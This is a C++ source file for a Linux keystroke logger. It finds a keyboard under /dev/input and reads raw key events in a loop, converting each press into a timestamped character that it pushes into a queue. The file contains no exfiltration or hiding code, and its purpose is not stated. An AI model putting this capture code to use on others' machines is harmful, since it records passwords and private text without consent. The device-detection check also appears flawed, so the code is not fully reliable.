// logger.cpp

#include "logger.h"

#include <linux/input-event-codes.h>
#include <nlohmann/json.hpp>
#include <sys/stat.h>
#include <sys/types.h>

#include <array>
#include <cassert>
#include <cstring>
#include <ctime>
#include <fcntl.h>
#include <filesystem>
#include <fstream>
#include <unistd.h>
#include <utility>

logger& logger::get_instance(tsq& queue) {
	static logger instance(queue);
	return instance;
}

logger::logger(tsq& queue)
: fd_(-1)
, initialized_(false)
, running_(false)
, keymap_(load_keymap("keymap.json"))
, q_(queue) {}

logger::~logger() {
	if (fd_ != -1) {
		close(fd_);
	}
}

auto logger::init(const std::string& event_ID) -> bool {
	assert(!check_init() && "logger (init): logger already initialized.");

	auto const device = std::string{event_ID.empty() ? find_kbd() : event_ID};
	assert(!device.empty() && "logger (init): no viable keyboard device found.");

	fd_ = open(device.c_str(), O_RDONLY | O_NONBLOCK);
	assert(fd_ != -1 && "logger (init): failed to open device.");

	initialized_ = true;
	ev_init_     = device;
	return true;
}

auto logger::check_init() const -> bool { return initialized_; }

auto logger::start() -> void {
	assert(check_init() && "logger (start): logger not initialized.");
	assert(!running_ && "logger (start): logger already running.");

	running_ = true;
	ev_reader();
}

auto logger::kill() -> void {
	running_ = false;
	if (fd_ != -1) {
		close(fd_);
		fd_ = -1;
	}
	initialized_ = false;
	ev_init_.clear();
}

auto logger::
  load_keymap(const std::string& config) -> std::unordered_map<unsigned int, std::pair<std::string, std::string>> {
	auto tmp  = std::unordered_map<unsigned int, std::pair<std::string, std::string>>{};
	auto conf = std::ifstream(config);

	assert(conf.is_open() && "logger (load_keymap): keymap config error.");

	auto keyconfig = nlohmann::json{};
	conf >> keyconfig;

	for (auto& [key, val] : keyconfig.items()) {
		auto code = std::stoi(key);
		auto name = std::string{val[0]};
		auto ch   = std::string{val[1]};
		tmp.emplace(code, std::make_pair(name, ch));
	}

	return tmp;
}

auto fd_monitor(signed int fd, fd_set fds) -> signed int {
	struct timeval timeout{1, 0};

	FD_ZERO(&fds);
	FD_SET(fd, &fds);

	auto const retval = select(fd + 1, &fds, nullptr, nullptr, &timeout);
	assert(retval != -1 && "logger (fd_monitor): select error.");

	return retval;
}

auto datetime(time_t tv_sec) -> std::pair<std::string, std::string> {
	auto date = std::array<char, 11>{};
	auto time = std::array<char, 9>{};

	std::tm* tv = std::localtime(&tv_sec);
	std::strftime(date.data(), date.size(), "%Y-%m-%d", tv);
	std::strftime(time.data(), time.size(), "%H:%M:%S", tv);

	return std::make_pair(std::string{date.data()}, std::string{time.data()});
}

auto find_kbd() -> std::string {
	auto const hardware_path = "/dev/input/by-id";
	auto const kbd_id        = "-event-kbd";

	assert(std::filesystem::exists(hardware_path) && std::filesystem::is_directory(hardware_path) &&
	       "logger (find_kbd): invalid input directory.");

	for (auto const& file : std::filesystem::directory_iterator(hardware_path)) {
		if (file.is_symlink() || file.is_character_file()) {
			auto const& path = file.path();
			if (path.filename().string().find(kbd_id) != std::string::npos) {
				auto       ec            = std::error_code{};
				auto const resolved_path = std::filesystem::canonical(path, ec);
				assert(!ec && "logger (find_kbd): symlink resolution error.");

				auto fd = open(resolved_path.c_str(), O_RDONLY | O_NONBLOCK);
				assert(fd != -1 && "logger (find_kbd): open error.");

				auto fds    = fd_set{};
				auto retval = fd_monitor(fd, fds);

				if (retval > 0 && FD_ISSET(fd, &fds)) {
					close(fd);
					return resolved_path.string();
				}
				close(fd);
			}
		}
	}
	assert(false && "logger (find_kbd): no keyboard found.");
	return "";
}

auto logger::ev_reader() -> void {
	auto ev = input_event{};
	auto n  = ssize_t{};
	while (running_) {
		n = read(fd_, &ev, sizeof(ev));
		assert(n != -1 && "logger (ev_reader): read error.");

		if (n == (ssize_t)sizeof(ev) && ev.type == EV_KEY) {
			auto  dtg = datetime(ev.time.tv_sec);
			event e{dtg.first, dtg.second, get_keychar(ev.code), ev.value ? true : false};
		    // TODO: does not handle held ctrl case, held shift case
            if (ev.value == true) {
                q_.push(e);
            }
        }

		fd_set fds;
		auto   retval = fd_monitor(fd_, fds);
		assert(retval != -1 && "logger (ev_reader): select error.");
	}
}

auto logger::get_keychar(unsigned int code) -> std::string {
	auto it = keymap_.find(code);
	assert(it != keymap_.end() && "logger (get_keychar): unknown key code.");
	return it->second.second;
}
